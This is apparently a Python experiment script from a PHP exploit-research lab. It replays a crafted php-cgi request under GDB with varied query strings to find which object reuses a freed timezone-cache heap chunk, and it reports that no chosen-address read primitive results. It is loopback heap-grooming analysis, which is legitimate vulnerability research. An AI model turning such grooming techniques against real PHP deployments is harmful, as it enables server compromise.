#!/usr/bin/env python3
"""Stage B: which object reuses the freed startup tzcache chunk?

Bounded negative experiment for the Stage A rung-4 claim. It replays the
committed splice-MID request under GDB with different query shapes and dumps
the stale HashTable at the PRE-RINIT decode warning (the second hit on the
pointer captured at php_date.c:505). The consumer computes

    nIndex = h | ht->nTableMask
    HT_HASH_EX(arData, nIndex) = ((uint32_t*)arData)[(int32_t)nIndex]

so a chosen-address read would need a real pointer at offset 16 (arData)
together with a zero or chosen mask at offset 12. Every shape tested gives
one of two occupants, never that combination:

  * a zend_string carrying a long query value: mask=0, arData=value length
    (small chosen integer) -> wild near-NULL read, SIGSEGV;
  * a real HashTable (short/nested values): mask=-2/-4/..., arData=real
    bucket pointer -> read lands in the table's own hash slots, rc 0.

Loopback only; all logs land in lab/build/evidence/stageB/.
"""
import importlib.util
import pathlib
import re
import tempfile

ROOT = pathlib.Path(__file__).resolve().parents[2]
GROOM = ROOT / 'lab/repro/php2shell-stageA-groom.py'
spec = importlib.util.spec_from_file_location('groom', GROOM)
groom = importlib.util.module_from_spec(spec)
spec.loader.exec_module(groom)

PHP = ROOT / 'lab/build/php-8.4.27-plain/sapi/cgi/php-cgi'
OUT = ROOT / 'lab/build/evidence/stageB'

QUERIES = [
    'XXX=ABCDEFGHIJ',                  # long value -> zend_string occupant
    'XXX[]=ABCDEFGHIJ',
    'XXX[0]=ABCDEFGHIJ',
    'XXX[ABCDEFGHIJ]=1',               # short value -> HashTable occupant
    'XXX[ABC]=1',
    'ABCDEFGHIJ=XXX',
    'XXX[12345678901234567890]=1',     # chosen numeric key hash
    'XXX[a]=1&XXX[b]=2',               # larger table, mask=-4
    'XXX[0]=1&XXX[1]=2&XXX[2]=3&XXX[3]=4',
    '',                                # no query: benign baseline
]


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    for query in QUERIES:
        tag = re.sub(r'[^A-Za-z0-9]', '_', query)[:32] or 'none'
        with tempfile.TemporaryDirectory(prefix='stageB-', dir=OUT) as tmp:
            log = OUT / ('occupant-%s.log' % tag)
            with log.open('w') as fh:
                rc, signals = groom.run_leg(PHP, pathlib.Path(tmp),
                                            'splice-mid', query, fh,
                                            use_gdb=True)
            text = log.read_text(errors='replace')
        hits = re.findall(r'^STALE ht=.*$', text, re.M)
        fault = 'SIGSEGV' if 'Program received signal SIGSEGV' in text else '-'
        print('%-38s gdb_rc=%d fault=%-7s %s' %
              (query or '(none)', rc, fault, hits[-1] if hits else 'NO HIT'))
        print('  log=%s' % log)


if __name__ == '__main__':
    main()
